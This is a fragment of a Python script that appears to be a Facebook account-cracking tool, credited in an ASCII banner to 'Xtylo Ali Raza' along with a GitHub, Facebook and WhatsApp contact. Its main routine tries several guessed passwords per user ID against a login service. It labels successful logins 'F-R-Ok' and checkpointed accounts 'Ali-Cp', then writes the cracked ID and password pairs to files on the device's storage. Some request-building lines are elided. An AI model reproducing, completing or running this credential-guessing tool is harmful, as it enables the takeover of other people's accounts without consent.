...
logo = """
        ...
        ██   ██ ███████ ██ 
\033[3m\033[1;97m══════════════════════════════════════════════
 [✓] Owner   : Xtylo Ali Raza x Syed F.R
 [✓] Github  : https://github.com/xtylo  
 [✓] Facebook: Xtylo Ali Raza
 [✓] Whatsapp: +923051200096
...
def crack_select():
	...
	def main(arg):
		...
		try:
			...
			q = json.loads(data)
			if "loc" in q:
				print("\033[1;92m[F-R-Ok] "+uid+" | "+pass1)
				...
				if "www.facebook.com" in q["error"]:
					print("\033[1;90m[Ali-Cp] "+uid+" | "+pass1)
					...
					q = json.loads(data)
					if "loc" in q:
						print("\033[1;92m[F-R-Ok] "+uid+" | "+pass2)
						ok = open("/sdcard/ids/Jam-Ok.txt", "a")
						ok.write(uid+" | "+pass2+"\n")
						ok.close()
						...
						if "www.facebook.com" in q["error"]:
							print("\033[1;90m[Ali-Cp] "+uid+" | "+pass2)
							cp = open("/sdcard/ids/jam_cp.txt","a")
							cp.write(uid+" | "+pass2+"\n")
							cp.close()
							...
							q = json.loads(data)
							if "loc" in q:
								print("\033[1;92m[F-R-Ok] "+uid+" | "+pass3)
								ok = open("/sdcard/ids/Jam-Ok.txt", "a")
								ok.write(uid+" | "+pass3+"\n")
								ok.close()
								...
								if "www.facebook.com" in q["error"]:
									print("\033[1;90m[Ali-Cp] "+uid+" | "+pass3)
									cp = open("/sdcard/ids/jam_cp.txt","a")
									cp.write(uid+" | "+pass3+"\n")
									cp.close()
									...
									if "loc" in q:
										...
										if "www.facebook.com" in q["error"]:
											print("\033[1;90m[Ali-Cp] "+uid+" | "+pass4)
											cp = open("/sdcard/ids/jam_cp.txt","a")
											cp.write(uid+" | "+pass4+"\n")
											cp.close()
											...
											q = json.loads(data)
											if "loc" in q:
												print("\033[1;92m[F-R-Ok] "+uid+" | "+pass5)
												ok = open("/sdcard/ids/Jam-Ok.txt", "a")
												ok.write(uid+" | "+pass5+"\n")
												ok.close()
												...
												if "www.facebook.com" in q["error"]:
													...
													q = json.loads(data)
													if "loc" in q:
														print("\033[1;92m[F-R-Ok] "+uid+" | "+pass6)
														...
														if "www.facebook.com" in q["error"]:
															print("\033[1;90m[Ali-Cp] "+uid+" | "+pass6)
															cp = open("/sdcard/ids/jam_cp.txt","a")
															cp.write(uid+" | "+pass6+"\n")
															cp.close()
